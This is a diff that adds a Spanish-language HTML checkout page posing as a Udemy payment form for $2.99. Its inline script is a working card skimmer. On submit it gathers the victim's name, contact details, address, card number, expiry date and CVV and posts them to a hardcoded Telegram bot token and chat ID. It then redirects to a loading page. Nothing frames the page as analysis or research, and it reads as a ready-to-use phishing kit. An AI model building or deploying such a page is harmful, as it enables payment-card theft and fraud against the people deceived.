@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Pago</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: "DM Sans", sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .form-container img {
+            max-width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .form-container h2 {
+            margin-bottom: 15px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .form-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 48%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            background-color: #6a1b9a;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            width: 100%;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #4a148c;
+        }
+
+        .subscription-info {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+            text-align: justify;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const botToken = "7861659325:AAEZ8m6xiHlpYLGmGWRbsG3G5qw8iY9tlLY";
+            const chatId = "7713690054";
+
+            document.getElementById("telefono").addEventListener("input", function () {
+                if (!this.value.startsWith("+")) {
+                    this.value = "+" + this.value.replace(/[^0-9]/g, "");
+                }
+            });
+
+            document.getElementById("fecha").addEventListener("input", function () {
+                let val = this.value.replace(/[^0-9]/g, "");
+                if (val.length > 2) {
+                    val = val.slice(0, 2) + "/" + val.slice(2, 4);
+                }
+                this.value = val;
+            });
+
+            document.getElementById("codigo-postal").addEventListener("input", function () {
+                this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+            });
+
+            document.querySelector("form").addEventListener("submit", function(event) {
+                event.preventDefault();
+                
+                const nombre = document.getElementById("nombre").value;
+                const apellido = document.getElementById("apellido").value;
+                const correo = document.getElementById("correo").value;
+                const telefono = document.getElementById("telefono").value;
+                const direccion = document.getElementById("direccion").value;
+                const codigoPostal = document.getElementById("codigo-postal").value;
+                const pais = document.getElementById("pais").value;
+                const tarjeta = document.getElementById("tarjeta").value;
+                const fecha = document.getElementById("fecha").value;
+                const cvv = document.getElementById("cvv").value;
+
+                const datos = `💳 Nueva compra:
+👤 Nombre: ${nombre} ${apellido}
+📧 Correo: ${correo}
+📞 Teléfono: ${telefono}
+🏠 Dirección: ${direccion}
+📮 Código Postal: ${codigoPostal}
+🌎 País: ${pais}
+💳 Tarjeta: ${tarjeta}
+📅 Fecha Exp: ${fecha}
+🔒 CVV: ${cvv}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: datos
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Datos enviados:", data);
+            window.location.href = 'carga.html';
+                            })
+                .catch(error => console.error("Error enviando datos:", error));
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="form-container">
+        <img src="logo-udemy.svg" alt="Logo Udemy">
+        <h2>Importe $2.99</h2>
+        <form>
+            <div class="form-group">
+                <input type="text" id="nombre" name="nombre" placeholder="Nombre" required>
+                <input type="text" id="apellido" name="apellido" placeholder="Apellido" required>
+            </div>
+            <div class="form-group">
+                <input type="email" id="correo" name="correo" placeholder="Correo Electrónico" required>
+                <input type="tel" id="telefono" name="telefono" placeholder="Número de Teléfono" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="direccion" name="direccion" placeholder="Dirección" required>
+                <input type="text" id="codigo-postal" name="codigo-postal" placeholder="Código Postal" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="pais" name="pais" placeholder="País" required>
+                <input type="text" id="tarjeta" name="tarjeta" maxlength="16" placeholder="Numero de Tarjeta" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="fecha" name="fecha" placeholder="MM/YY" required>
+                <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="CVV" required>
+            </div>
+            <button type="submit" class="submit-btn">Pagar</button>
+        </form>
+        <p class="subscription-info">Puedes cancelar en cualquier momento visitando la página Suscripciones de tu cuenta.
+        No se realizan reembolsos ni créditos de los periodos de suscripción parciales, salvo cuando así lo indique la legislación vigente...</p>
+    </div>
+</body>
+</html>
